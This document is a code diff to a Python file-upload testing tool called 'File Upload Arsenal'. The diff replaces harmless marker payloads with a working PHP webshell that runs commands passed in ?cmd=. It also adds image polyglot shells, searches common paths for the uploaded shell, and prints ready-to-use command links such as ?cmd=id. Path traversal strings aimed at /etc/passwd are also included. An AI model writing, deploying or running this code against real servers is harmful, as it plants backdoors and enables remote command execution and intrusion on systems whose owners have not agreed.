@@ -14,7 +14,6 @@ import argparse
 import os
 import sys
 import time
-import threading
 from concurrent.futures import ThreadPoolExecutor
 from urllib.parse import urlparse, urljoin
 
@@ -26,6 +25,9 @@ Y = '\033[93m'
 R = '\033[91m'
 W = '\033[0m'
 
+# --- Standard PHP webshell payload (you control ?cmd=) ---
+PHP_SHELL = "<?php system($_GET['cmd']); ?>"
+
 
 def banner():
     print(fr"""{G}
@@ -34,11 +36,11 @@ def banner():
      \ V / / /|      / /   / __ \/ _ \/ ___/ //_/
       \ / / / |     / /___/ / / /  __/ /__/ ,<   
        \_/_/_/|_|____\____/_/ /_/\___/\___/_/|_|  
-                /_____/ File Upload Arsenal v3.0
+                /_____/ File Upload Arsenal v3.1
     {W}""")
 
 
-# -------- Polyglot generators (from your guide) -------- #
+# -------- Polyglot generators -------- #
 
 def polyglot_jpeg_php():
     jpeg_header = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01'
@@ -56,13 +58,13 @@ def polyglot_gif_php():
     return b'GIF89a<?php system($_GET["cmd"]); ?>'
 
 
-# -------- Helper for upload discovery (from guide) -------- #
+# -------- Helper for upload discovery -------- #
 
 COMMON_UPLOAD_PATHS = [
     "uploads", "upload", "files", "media",
     "attachments", "images", "assets",
     "static", "public", "storage"
-]  # [file:1]
+]
 
 
 def filename_variants(filename: str):
@@ -71,13 +73,17 @@ def filename_variants(filename: str):
         filename,
         filename.lower(),
         filename.upper(),
-        base,                         # without extension
-        filename.replace(".", ""),    # no dots
-        filename.replace(" ", "_"),   # spaces to underscore
-    }  # [file:1]
+        base,
+        filename.replace(".", ""),
+        filename.replace(" ", "_"),
+    }
 
 
 def try_find_uploaded(base_url, filename, session, verbose=False):
+    """
+    Try common paths + name variants to find where the file is served,
+    so you can hit ?cmd= manually.
+    """
     parsed = urlparse(base_url)
     base = f"{parsed.scheme}://{parsed.netloc}"
     for variant in filename_variants(filename):
@@ -95,7 +101,7 @@ def try_find_uploaded(base_url, filename, session, verbose=False):
     return None
 
 
-# -------- Core tester class (enterprise-style) -------- #
+# -------- Core tester class -------- #
 
 class FileUploadTester:
     def __init__(self, target_url: str, param_name: str,
@@ -139,7 +145,6 @@ class FileUploadTester:
         return response.status_code in (200, 201) and any(k in text for k in keywords)
 
     def make_extensions_list(self):
-        # Based on your checklist extensions set.[file:1]
         return [
             "php", "php2", "php3", "php4", "php5", "php6", "php7",
             "phtml", "phps", "pht", "phar",
@@ -151,10 +156,9 @@ class FileUploadTester:
             "php.php.jpg", "php.jpg.php",
             "php%00.jpg",
             "php.", "php .jpg",
-        ]  # [file:1]
+        ]
 
     def make_mimes_list(self):
-        # Derived from MIME bypass section.[file:1]
         return [
             "image/jpeg",
             "image/png",
@@ -162,11 +166,12 @@ class FileUploadTester:
             "application/pdf",
             "text/plain",
             "application/octet-stream",
-        ]  # [file:1]
+        ]
 
     def build_payload_content(self, ext: str):
-        php_shell = "<?php system($_GET['cmd']); ?>"
-        # image/polyglot cases
+        """
+        Always build a ?cmd= webshell-style payload when possible.
+        """
         e = ext.lower()
         if "jpg" in e or "jpeg" in e:
             return polyglot_jpeg_php()
@@ -174,20 +179,22 @@ class FileUploadTester:
             return polyglot_png_php()
         if "gif" in e:
             return polyglot_gif_php()
-        return php_shell
+        # default to plain PHP shell
+        return PHP_SHELL
 
     # -------- Test suites -------- #
 
     def test_basic(self):
-        """Direct .php and simple tricks (P0)."""  # [file:1]
+        """Direct .php and simple tricks (P0)."""
         self.info("Running BASIC upload tests (direct .php, double extensions)...")
 
+        # Use PHP_SHELL for all basic candidates so you can do ?cmd=
         candidates = [
-            ("shell.php", "<?php echo 'VULNERABLE'; ?>", "application/x-php"),
-            ("shell.php.jpg", "<?php echo 'VULNERABLE'; ?>", "image/jpeg"),
-            ("shell.pHp", "<?php echo 'VULNERABLE'; ?>", "application/x-php"),
-            ("shell.php%00.jpg", "<?php echo 'VULNERABLE'; ?>", "image/jpeg"),
-        ]  # [file:1]
+            ("shell.php", PHP_SHELL, "application/x-php"),
+            ("shell.php.jpg", PHP_SHELL, "image/jpeg"),
+            ("shell.pHp", PHP_SHELL, "application/x-php"),
+            ("shell.php%00.jpg", PHP_SHELL, "image/jpeg"),
+        ]
 
         for fname, content, mime in candidates:
             files = {self.param_name: (fname, content, mime)}
@@ -199,23 +206,36 @@ class FileUploadTester:
                 continue
 
             if r.status_code == 200:
+                msg = f"Endpoint accepts {fname} ({mime})"
                 self.success(
-                    f"Endpoint accepts {fname} ({mime})",
+                    msg,
                     severity="Critical",
                     vuln_type="DirectUpload"
                 )
+                # Try to discover URL and print ready-to-use ?cmd= links
+                url = try_find_uploaded(self.target_url, fname, self.session, self.verbose)
+                if url:
+                    self.success(
+                        f"Potential webshell reachable at {url}?cmd=id",
+                        severity="Critical",
+                        vuln_type="WebShell"
+                    )
+                    print(f"{G}[+] Try: {url}?cmd=id{W}")
+                    print(f"{G}[+] Try: {url}?cmd=whoami{W}")
+                    print(f"{G}[+] Try: {url}?cmd=ls+-la{W}")
 
     def test_mime(self):
-        """MIME/Content-Type bypass tests (P1)."""  # [file:1]
+        """MIME/Content-Type bypass tests (P1)."""
         self.info("Running MIME/Content-Type bypass tests...")
 
+        # Also use PHP_SHELL so a MIME-bypassed upload can still be a shell
         payloads = [
-            ("shell.jpg", "<?php echo 'MIME-BYPASS'; ?>", "image/jpeg"),
-            ("shell.png", "<?php echo 'MIME-BYPASS'; ?>", "image/png"),
-            ("shell.gif", "<?php echo 'MIME-BYPASS'; ?>", "image/gif"),
-            ("shell.pdf", "<?php echo 'MIME-BYPASS'; ?>", "application/pdf"),
-            ("shell.bin", "<?php echo 'MIME-BYPASS'; ?>", "application/octet-stream"),
-        ]  # [file:1]
+            ("shell.jpg", PHP_SHELL, "image/jpeg"),
+            ("shell.png", PHP_SHELL, "image/png"),
+            ("shell.gif", PHP_SHELL, "image/gif"),
+            ("shell.pdf", PHP_SHELL, "application/pdf"),
+            ("shell.bin", PHP_SHELL, "application/octet-stream"),
+        ]
 
         for fname, content, mime in payloads:
             files = {self.param_name: (fname, content, mime)}
@@ -232,14 +252,24 @@ class FileUploadTester:
                     severity="Medium",
                     vuln_type="MIMEBypass"
                 )
+                # Optionally also try to find a reachable shell URL
+                url = try_find_uploaded(self.target_url, fname, self.session, self.verbose)
+                if url:
+                    self.success(
+                        f"Potential webshell via MIME bypass at {url}?cmd=id",
+                        severity="Critical",
+                        vuln_type="WebShell"
+                    )
+                    print(f"{G}[+] Try: {url}?cmd=id{W}")
+                    print(f"{G}[+] Try: {url}?cmd=ls+-la{W}")
 
     def create_polyglots(self):
-        """Polyglot corpus from your guide."""  # [file:1]
+        """Polyglot corpus."""
         polyglots = {
             "jpegphp.jpg": polyglot_jpeg_php(),
             "pngphp.png": polyglot_png_php(),
             "gifphp.gif": polyglot_gif_php(),
-            # simple JS-in-PDF polyglot
+            # simple JS-in-PDF polyglot (no ?cmd= here, just bypass check)
             "pdfjs.pdf": (
                 b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R "
                 b"/OpenAction << /S /JavaScript /JS (app.alert('PDF-JS Polyglot')) >> >>\nendobj\n"
@@ -248,7 +278,7 @@ class FileUploadTester:
         return polyglots
 
     def test_polyglot(self):
-        """Polyglot / magic-byte bypass tests (P0)."""  # [file:1]
+        """Polyglot / magic-byte bypass tests (P0)."""
         self.info("Running polyglot (magic bytes) tests...")
 
         mimes = self.make_mimes_list()
@@ -270,9 +300,20 @@ class FileUploadTester:
                         severity="Critical",
                         vuln_type="PolyglotBypass"
                     )
+                    # For the PHP image polyglots, this is also a shell
+                    if fname in ("jpegphp.jpg", "pngphp.png", "gifphp.gif"):
+                        url = try_find_uploaded(self.target_url, fname, self.session, self.verbose)
+                        if url:
+                            self.success(
+                                f"Polyglot webshell reachable at {url}?cmd=id",
+                                severity="Critical",
+                                vuln_type="WebShell"
+                            )
+                            print(f"{G}[+] Try: {url}?cmd=id{W}")
+                            print(f"{G}[+] Try: {url}?cmd=ls+-la{W}")
 
     def test_path(self):
-        """Path traversal in filename/parameter (P0)."""  # [file:1]
+        """Path traversal in filename/parameter (P0)."""
         self.info("Running path traversal tests in filename...")
 
         traversals = [
@@ -281,7 +322,7 @@ class FileUploadTester:
             "..\\..\\windows\\system32\\cmd.exe",
             "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
             "..00..00etcpasswd",
-        ]  # [file:1]
+        ]
 
         for traversal in traversals:
             files = {self.param_name: (traversal, "PATH_TRAVERSAL_TEST", "text/plain")}
@@ -300,8 +341,9 @@ class FileUploadTester:
                 )
 
     def _race_worker(self, filename: str) -> bool:
-        """Single race attempt."""  # [file:1]
-        content = f"<?php echo 'RACE-{filename}'; ?>"
+        """Single race attempt."""
+        # Also use PHP_SHELL so if race wins, you get ?cmd= shell
+        content = PHP_SHELL
         files = {self.param_name: (filename, content, "application/x-php")}
         upload_resp = self.session.post(self.target_url, files=files, timeout=10)
         if upload_resp.status_code not in (200, 201):
@@ -315,19 +357,23 @@ class FileUploadTester:
         for _ in range(10):
             try:
                 r = self.session.get(access_url, timeout=3)
-                if f"RACE-{filename}" in r.text:
+                # Simple check that something comes back; for real use, you can
+                # look for known markers or just rely on manual ?cmd= later.
+                if r.status_code == 200:
                     self.success(
-                        f"Race condition: executable upload reachable at {access_url}",
+                        f"Race condition: uploaded file reachable at {access_url}?cmd=id",
                         severity="High",
                         vuln_type="RaceCondition"
                     )
+                    print(f"{G}[+] Try: {access_url}?cmd=id{W}")
+                    print(f"{G}[+] Try: {access_url}?cmd=ls+-la{W}")
                     return True
             except Exception:
                 continue
         return False
 
     def test_race(self):
-        """TOCTOU race condition on upload + access (P1)."""  # [file:1]
+        """TOCTOU race condition on upload + access (P1)."""
         if not self.access_pattern:
             self.warn("Race test skipped: --access-pattern not provided.")
             return
@@ -396,16 +442,16 @@ class FileUploadTester:
             lines.append("1. Implement strict server-side validation.")
             lines.append("2. Validate magic bytes, not just extensions.")
             lines.append("3. Store files outside webroot.")
-            lines.append("4. Implement Content Disarm & Reconstruction pipeline.")  # [file:1]
+            lines.append("4. Implement Content Disarm & Reconstruction pipeline.")
         else:
             for i, v in enumerate(self.vulnerabilities, start=1):
                 lines.append(f"{i}. [{v['severity']}] {v['type']} - {v['message']}")
             lines.append("")
             lines.append("Recommended actions (from file upload checklist):")
-            lines.append("1. Immediately block dynamic extensions (.php, .asp, .jsp, etc.).")  # [file:1]
+            lines.append("1. Immediately block dynamic extensions (.php, .asp, .jsp, etc.).")
             lines.append("2. Short-term: enforce magic byte verification.")
             lines.append("3. Medium-term: move uploads outside webroot with strict ACLs.")
-            lines.append("4. Long-term: introduce file sanitization pipeline (CDR).")  # [file:1]
+            lines.append("4. Long-term: introduce file sanitization pipeline (CDR).")
 
         return "\n".join(lines)
 
